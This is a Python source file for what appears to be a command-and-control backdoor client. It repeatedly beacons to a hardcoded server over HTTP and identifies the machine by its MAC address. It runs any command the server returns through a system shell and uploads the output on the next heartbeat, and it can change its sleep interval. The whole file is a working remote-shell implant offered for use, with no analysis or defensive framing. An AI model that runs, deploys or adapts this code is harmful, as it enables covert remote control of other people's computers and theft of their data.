#!/usr/bin/python
# coding=utf-8
'''
Author: Recar
Date: 2022-10-03 08:16:11
LastEditors: Recar
LastEditTime: 2022-10-03 11:52:24
'''

import sys
import time
import json
import uuid
import signal
import platform
import requests
import subprocess


def ctrl_c(signum,frame):
    print()
    print("[-] input ctrl c")
    sys.exit()

signal.signal(signal.SIGINT, ctrl_c)


def run_cmd(cmd):
    p = subprocess.Popen(cmd, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, shell=True, close_fds=True,
                         start_new_session=True)
    formats = 'gbk' if platform.system() == "Windows" else 'utf-8'
    try:
        result = p.stdout.read()
        p.wait()
        return result.decode(formats)
    except :
        return "命令执行错误"

class Client():
    def __init__(self):
        self.server_ip = "192.168.248.130"
        self.server_port = "5050"
        self.base_url = "http://"+self.server_ip+":"+self.server_port
        self.token = "bkq98"
        self.init_name()
        self.sleep_time = 3
        self.cmd_id = None
        self.result = ""

    def init_name(self):
        self.name = uuid.UUID(  int=uuid.getnode() ).hex[-12:]

    def send_data(self, url, data):
        try:
            response = requests.post(url,json=data, timeout=10)
            return response
        except Exception as e:
            print("[-] "+e)
            return None

    def heartbeat(self):
        # 有上次的执行结果就上传 没有就心跳 
        # server返回有命令且不是上一次的命令则 执行命令存储结果等待下一次心跳上传执行结果
        url = self.base_url+"/heartbeat/"
        data = {
            "token": self.token,
            "name": self.name,
            "result": self.result,
            "cmd_id": self.cmd_id
        }
        if self.result !="":
            data["result"] = self.result
            self.result = ""
        response = self.send_data(url, data)
        if response==None:
            return
        # 有命令需要执行并返回
        if response.status_code==200:
            server_data = json.loads(response.content)
            cmd = server_data.get("cmd", "")
            cmd_id = server_data.get("cmd_id", "")
            if cmd_id == self.cmd_id:
                return
            if cmd:
                print("[+] cmd: "+cmd)
                self.result = str(self.exec(cmd))
                print("[*] result: "+self.result)
                self.cmd_id = cmd_id

    def exec(self, cmd):
        if cmd.startswith("sleep"):
            self.sleep_time = int(cmd.split(" ")[-1])
            return "time set ok"
        if cmd.startswith("msf"):
            #TODO
            return "msf set ok"
        return run_cmd(cmd)

    def run(self):
        # 心跳
        while True:
            self.heartbeat()
            time.sleep(self.sleep_time)

if __name__ == "__main__":
    print("[+] start client")
    client = Client()
    client.run()